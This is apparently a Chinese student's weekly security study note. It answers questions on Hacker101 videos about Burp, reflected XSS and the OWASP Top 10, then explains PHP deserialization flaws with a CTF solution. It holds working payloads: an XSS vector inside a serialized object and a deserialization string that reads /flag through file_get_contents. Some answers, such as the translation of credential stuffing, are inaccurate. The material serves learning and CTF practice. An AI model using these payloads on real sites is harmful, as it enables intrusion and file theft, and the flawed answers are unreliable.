---
title: Nep第四周
---



# Nep第四周

## 观看视频

###  1.观看视频一，回答下列问题：视频一：https://www.hacker101.com/sessions/introduction.html

1.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（5分） 

Burp Proxy和Firefox

作用：监控http和https流量

Firefox优点：可以简单设置代理，无需设置整个系统，有很好的开发工具，可以查看cookie。



2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）

要先于别人突破，不要像防御者那样思考，而要像攻击者一样思考。我们需要知道攻击者的目标、思考方式、操作方法。时间是有限的，需要优先考虑重要的、高风险的区域。



 3.审计以下代码：

```
<?php 
if(isset($_GET[ ' name ' ])){ 
echo "<h1>Hello {$_GET['name']} !</h1>"; 
}
?> 
<form method="GET">
Enter your name: <input type="input" name="name"><br>
<input type=" submit">  
```

本段代码涉及到客户端，服务端以及通信协议。运行在客户端的代码主要有HTML以及javascript，由浏览器核心负责解释 通信协议为HTTP协议，有多种格式的请求包，常见的为POST与GET 运行在服务端的代码为php，由php核心负责解释。 用户端与服务端通过HTTP通信协议进行交互。 那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分）

服务端：

```
<?php
if(isset($_GET[ ' name ' ])){
echo "<h1>Hello {$_GET['name']} !</h1>";
}
?>
```

客户端：

```
<form method="GET">
Enter your name: <input type="input" name="name"><br>
<input type=" submit">
```

客户端是通过传递什么参数来控制服务端代码的？（1分）

通过GET请求，传递name的参数

 客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分）

是xss漏洞，反射型xss漏洞，反射型xss漏洞是通过get或者post请求时，被后端处理过数据，并且响应到前端页面上



 4.思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分）

通过窃取cookie，keyloger代码

预防：设置完善的过滤体系，只允许用户输入合法的值；Html encode，对标签进行转换



### 2.观看视频二，回答下列问题：

视频二：https://www.hacker101.com/sessions/pentest_owasp

1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分）

注入、失效的身份认证、敏感信息泄露、XML 外部实体（XXE）、失效的访问控制、安全配置错误、跨站脚本（XSS）、不安全的反序列化、使用含有已知漏洞的组件、不足的日志记录和监控

按照漏洞的严重程度排序



2.请翻译一下credential stuffing（1分） 

证书填充，是一种攻击方式



3.为什么说不充分的日志记录(insufficient logging)也算owasp十大漏洞的一种？他的危害性如何（2分） 

原因：对不足的日志记录及监控的利用几乎是每一个重大安全事件的温床。攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。

危害性很大，如果你的应用使得日志信息或告警信息对用户或者攻击者可见，你就很容易遭受信息泄露攻击



4.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（3分）

利用checklist，对照指南进行渗透测试。

平时在网上看大佬的文章，然后去做题，不会再继续找大佬的文章学，还是练习太少了，自己都做不出来，要多学习



 5.you are only as good as you notes   you are only as good as things you can refer to结合这两句话谈谈你的感想。（2分）

你所能做到最好的就是你所说所想的，我们不能自视甚高，但更不能妄自菲薄。不自卑，要自信，姐就是女王，自信放光芒







## PHP反序列化漏洞

**serialize**可以将一个对象（变量）转换成可以传输的字符串，并且在转换的过程中可以保存当前变量的值；

而**unserialize**可以将serialize生成的字符串再转换回变量。



序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。





### 例

```php
<?php
class A{
    var $test = "zuo";
    function __wakeup(){
            echo $this->test;
    }
}
$a = $_GET['a'];
$b = unserialize($a);
?>
```

可以看到其中反序列化的a变量是可控的，并且一旦反序列化会自动执行魔法方法`__wakeup`并且输出test。

**构造序列化代码**的时候插入xss

```php
<?php
class A{
    var $test = "<img src=1 onerror=alert(1)>";
    function __wakeup(){
            echo $this->test;
    }
}
$c = new A();
$c = serialize($c);
echo $c;
?>
```

如图，输出`O:1:"A":1:{s:4:"test";s:28:"<img src=1 onerror=alert(1)>";}`

![](https://gitee.com/chen-lishan/tuc/raw/master/1..png)

可以构造payload：

```
https://127.0.0.1/test.php?a=O:1:"A":1:{s:4:"test";s:28:"<img src=1 onerror=alert(1)>";}
```



可以看到直接导致xss攻击，如果`__wakeup`中不是`echo()`，而是`eval()`那么就是任意代码执行，危害就更大了。





### 漏洞利用条件

1.unserialize函数的参数可控

2.所写的内容需要有对象中的成员变量的值

3.脚本中存在一些PHP的魔法函数如：

(如果服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术方法里面的话，就容易造成严重漏洞)

```
`__construct` 当一个对象创建时自动调用

`__wakeup` 使用unserialse()函数时会自动调用

`__destruct` 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)

`__toString` 当一个对象被当作一个字符串被调用。

`__sleep()` 使用serialize()函数时触发

`__call()`  在对象上下文中调用不可访问的方法时触发 

`__callStatic()` 在静态上下文中调用不可访问的方法时触发

`__get()` 用于从不可访问的属性读取数据

`__set()` 用于将数据写入不可访问的属性

`__isset()` 在不可访问的属性上调用isset()或empty()触发 

`__unset()` 在不可访问的属性上使用unset()时触发

`__toString()` 把类当作字符串使用时触发,返回值需要为字符串

`__invoke()` 当脚本尝试将对象调用为函数时触发
```

 



### 题目

#### unserialize1

源码

```php
<?php
    show_source(__FILE__);
    class XianZhi{
        public $name;
        function __destruct(){
          echo file_get_contents($this->name);
        }
    }

    unserialize($_GET['a']);
?>
```

构造如下代码

```php
<?php
    show_source(__FILE__);
    class XianZhi{
        public $name;
        function __destruct(){
          echo file_get_contents($this->name);
        }
    }
    $a = new XianZhi();
    echo serialize($a);
?>
```

编译运行得到：

```
O:7:"XianZhi":1:{s:4:"name";N;}
```



![](https://gitee.com/chen-lishan/tuc/raw/master/微信截图_20210426002850.png)

提示：Filename cannot be empty

要找的文件是flag，于是构造以下序列化代码：

```php
<?php
    class XianZhi{
         public $name = '/flag';
    }
    $a = new XianZhi();
    echo serialize($a);
?> 
```

得到payload：

```
/?a=O:7:"XianZhi":1:{s:4:"name";s:5:"/flag";}
```

